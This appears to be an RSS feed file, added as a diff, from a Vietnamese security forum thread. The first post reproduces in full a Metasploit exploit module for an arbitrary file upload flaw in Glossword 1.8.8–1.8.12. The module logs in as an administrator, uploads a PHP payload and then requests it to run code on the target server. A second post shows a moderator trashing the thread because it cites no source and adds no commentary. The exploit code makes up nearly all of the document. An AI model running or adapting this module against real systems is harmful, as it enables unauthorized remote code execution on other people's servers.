@@ -1,0 +1,244 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/33.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability</title>
+				<description><![CDATA[ 
+Đây là exploit Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability cho metasploit
+Code:
+
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#  <span class="link"> http://metasploit.com/framework/</span>
+##
+
+require 'msf/core'
+
+class Metasploit3 &lt; Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           =&gt; &quot;Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability&quot;,
+			'Description'    =&gt; %q{
+				This module exploits a file upload vulnerability in Glossword
+				versions 1.8.8 to 1.8.12 when run as a standalone application.
+				This application has an upload feature that allows an authenticated user
+				with administrator roles to upload arbitrary files to the 'gw_temp/a/'
+				directory.
+			},
+			'License'        =&gt; MSF_LICENSE,
+			'Author'         =&gt;
+				[
+					'AkaStep', # Discovery
+					'Brendan Coles &lt;bcoles[at]gmail.com&gt;' # metasploit exploit
+				],
+			'References'     =&gt;
+				[
+					[ 'EDB',  '24456' ],
+					[ 'OSVDB' '89960' ]
+				],
+			'Platform'       =&gt; 'php',
+			'Arch'           =&gt; ARCH_PHP,
+			'Targets'        =&gt; [['Automatic Targeting', { 'auto' =&gt; true }]],
+			'Privileged'     =&gt; true,
+			'DisclosureDate' =&gt; &quot;Feb 05 2013&quot;,
+			'DefaultTarget'  =&gt; 0))
+
+		register_options(
+			[
+				OptString.new('TARGETURI', [true, 'The path to the web application', '/glossword/1.8/']),
+				OptString.new('USERNAME',  [true, 'The username for Glossword', 'admin']),
+				OptString.new('PASSWORD',  [true, 'The password for Glossword', 'admin'])
+			], self.class)
+	end
+
+	def check
+
+		base  = target_uri.path
+		peer  = &quot;#{rhost}:#{rport}&quot;
+		user  = datastore['USERNAME']
+		pass  = datastore['PASSWORD']
+
+		# login
+		print_status(&quot;#{peer} - Authenticating as user '#{user}'&quot;)
+		begin
+			res = login(base, user, pass)
+			if res
+				if res.code == 200
+					print_error(&quot;#{peer} - Authentication failed&quot;)
+					return Exploit::CheckCode::Unknown
+				elsif res.code == 301 and res.headers['set-cookie'] =~ /sid([\da-f]+)=([\da-f]{32})/
+					print_good(&quot;#{peer} - Authenticated successfully&quot;)
+					return Exploit::CheckCode::Appears
+				end
+			end
+			return Exploit::CheckCode::Safe
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			print_error(&quot;#{peer} - Connection failed&quot;)
+		end
+		return Exploit::CheckCode::Unknown
+
+	end
+
+	def on_new_session(client)
+		if client.type == &quot;meterpreter&quot;
+			client.core.use(&quot;stdapi&quot;) if not client.ext.aliases.include?(&quot;stdapi&quot;)
+			client.fs.file.rm(&quot;#{@fname}&quot;)
+		else
+			client.shell_command_token(&quot;rm #{@fname}&quot;)
+		end
+	end
+
+	def upload(base, sid, fname, file)
+
+		user = datastore['USERNAME']
+		pass = datastore['PASSWORD']
+		data = Rex::MIME::Message.new
+		data.add_part(file,       'application/x-php', nil, &quot;form-data; name=\&quot;file_location\&quot;; filename=\&quot;#{fname}\&quot;&quot;)
+		data.add_part(&quot;edit-own&quot;, nil, nil, 'form-data; name=&quot;a&quot;')
+		data.add_part(&quot;users&quot;,    nil, nil, 'form-data; name=&quot;t&quot;')
+		data.add_part(&quot;Save&quot;,     nil, nil, 'form-data; name=&quot;post&quot;')
+		data.add_part(&quot;#{sid}&quot;,   nil, nil, 'form-data; name=&quot;sid&quot;')
+		data.add_part(&quot;#{user}&quot;,  nil, nil, 'form-data; name=&quot;arPost[login]&quot;')
+		data.add_part(&quot;#{pass}&quot;,  nil, nil, 'form-data; name=&quot;arPost[pass_new]&quot;')
+		data.add_part(&quot;#{pass}&quot;,  nil, nil, 'form-data; name=&quot;arPost[pass_confirm]&quot;')
+
+		data_post = data.to_s
+		data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')
+
+		res = send_request_cgi({
+			'method'  =&gt; 'POST',
+			'uri'     =&gt; normalize_uri(base, 'gw_admin.php'),
+			'ctype'   =&gt; &quot;multipart/form-data; boundary=#{data.bound}&quot;,
+			'data'    =&gt; data_post,
+		})
+
+		return res
+	end
+
+	def login(base, user, pass)
+
+		res   = send_request_cgi({
+			'method' =&gt; 'POST',
+			'uri'    =&gt; normalize_uri(base, 'gw_login.php'),
+			'data'   =&gt; &quot;arPost%5Buser_name%5D=#{user}&arPost%5Buser_pass%5D=#{pass}&arPost%5Blocale_name%5D=en-utf8&a=login&sid=&post=Enter&quot;
+		})
+		return res
+
+	end
+
+	def exploit
+
+		base  = target_uri.path
+		@peer = &quot;#{rhost}:#{rport}&quot;
+		@fname= rand_text_alphanumeric(rand(10)+6) + '.php'
+		user  = datastore['USERNAME']
+		pass  = datastore['PASSWORD']
+
+		# login; get session id and token
+		print_status(&quot;#{@peer} - Authenticating as user '#{user}'&quot;)
+		res = login(base, user, pass)
+		if res and res.code == 301 and res.headers['set-cookie'] =~ /sid([\da-f]+)=([\da-f]{32})/
+			token = &quot;#{$1}&quot;
+			sid   = &quot;#{$2}&quot;
+			print_good(&quot;#{@peer} - Authenticated successfully&quot;)
+		else
+			fail_with(Exploit::Failure::NoAccess, &quot;#{@peer} - Authentication failed&quot;)
+		end
+
+		# upload PHP payload
+		print_status(&quot;#{@peer} - Uploading PHP payload (#{payload.encoded.length} bytes)&quot;)
+		php = %Q|&lt;?php #{payload.encoded} ?&gt;|
+		begin
+			res = upload(base, sid, @fname, php)
+			if res and res.code == 301 and res['location'] =~ /Setting saved/
+				print_good(&quot;#{@peer} - File uploaded successfully&quot;)
+			else
+				fail_with(Exploit::Failure::UnexpectedReply, &quot;#{@peer} - Uploading PHP payload failed&quot;)
+			end
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			fail_with(Exploit::Failure::Unreachable, &quot;#{@peer} - Connection failed&quot;)
+		end
+
+		# retrieve PHP file path
+		print_status(&quot;#{@peer} - Locating PHP payload file&quot;)
+		begin
+			res   = send_request_cgi({
+				'method' =&gt; 'GET',
+				'uri'    =&gt; normalize_uri(base, 'gw_admin.php?a=edit-own&t=users'),
+				'cookie' =&gt; &quot;sid#{token}=#{sid}&quot;
+			})
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			fail_with(Exploit::Failure::Unreachable, &quot;#{@peer} - Connection failed&quot;)
+		end
+		if res and res.code == 200 and res.body =~ /&lt;img width="" height="" src="([^"]+)"/
+			shell_uri = "#{$1}"
+			@fname    = shell_uri.match('(\d+_[a-zA-Z\d]+\.php)')
+			print_good("#{@peer} - Found payload file path (#{shell_uri})")
+		else
+			fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Failed to find PHP payload file path")
+		end
+
+		# retrieve and execute PHP payload
+		print_status("#{@peer} - Executing payload (#{shell_uri})")
+		begin
+			send_request_cgi({
+				'method' &gt; 'GET',
+				'uri'    =&gt; normalize_uri(base, shell_uri),
+			})
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			fail_with(Exploit::Failure::Unreachable, &quot;#{@peer} - Connection failed&quot;)
+		end
+		if !res or res.code != 200
+			fail_with(Exploit::Failure::UnexpectedReply, &quot;#{@peer} - Executing payload failed&quot;)
+		end
+	end
+end
+
+
+
+
+
+
+
+Comments
+No comments so far
+
+
+
+
+© Offensive Security 2011
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/44341.hva#273811</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/44341.hva#273811</link>
+				<pubDate><![CDATA[Sat, 2 Mar 2013 09:16:43]]> GMT</pubDate>
+				<author><![CDATA[ crazykid]]></author>
+			</item>
+			<item>
+				<title>Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability</title>
+				<description><![CDATA[ Bài viết bị dời vào trash vì các lý do:
+
+- Không ghi rõ nguồn gốc
+- Không có bình luận của cá nhân về bug hoặc exploit 
+- Code không đưa vào thẻ code
+
+Trân trọng!
+
+- Ky0 -]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/44341.hva#273843</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/44341.hva#273843</link>
+				<pubDate><![CDATA[Mon, 4 Mar 2013 04:19:23]]> GMT</pubDate>
+				<author><![CDATA[ Ky0]]></author>
+			</item>
+	</channel>
+</rss>
